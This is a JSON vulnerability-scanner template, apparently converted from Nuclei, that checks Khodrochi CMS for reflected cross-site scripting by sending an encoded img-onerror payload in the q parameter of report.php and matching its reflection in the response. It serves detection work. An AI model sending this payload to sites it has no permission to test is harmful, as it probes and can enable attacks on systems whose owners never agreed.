@@ -1,0 +1,119 @@
+{
+  "id": "khodrochi-cms-xss",
+  "name": "Khodrochi CMS - Cross Site Scripting",
+  "author": "r3Y3r53",
+  "severity": "MEDIUM",
+  "description": "A cross site scripting vulnerability was found in the Khodrochi.ir CMS an Iranian Car Services Platform.\n",
+  "references": [
+    "https://www.exploitalert.com/view-details.html?id\u003d38723",
+    "https://cxsecurity.com/ascii/WLB-2022050087"
+  ],
+  "tags": [
+    "khodrochi",
+    "cms",
+    "xss"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/specification/report.php?q\u003d%22%3E%3Cimg%20src\u003dx%20onerror\u003dprompt(document.domain)%3E",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code \u003d\u003d 200",
+            "contains(header, \"text/html\")",
+            "contains(body, \"class\u003d\\\"cons_form\") \u0026\u0026 contains(body, \"\u003e\u003cimg src\u003dx onerror\u003dprompt(document.domain)\u003e\")"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "khodrochi-cms-xss",
+    "info": {
+      "name": "Khodrochi CMS - Cross Site Scripting",
+      "author": "r3Y3r53",
+      "severity": "medium",
+      "description": "A cross site scripting vulnerability was found in the Khodrochi.ir CMS an Iranian Car Services Platform.\n",
+      "reference": [
+        "https://www.exploitalert.com/view-details.html?id\u003d38723",
+        "https://cxsecurity.com/ascii/WLB-2022050087"
+      ],
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "khodrochi,cms,xss"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/specification/report.php?q\u003d%22%3E%3Cimg%20src\u003dx%20onerror\u003dprompt(document.domain)%3E"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code \u003d\u003d 200",
+              "contains(header, \"text/html\")",
+              "contains(body, \"class\u003d\\\"cons_form\") \u0026\u0026 contains(body, \"\u003e\u003cimg src\u003dx onerror\u003dprompt(document.domain)\u003e\")"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
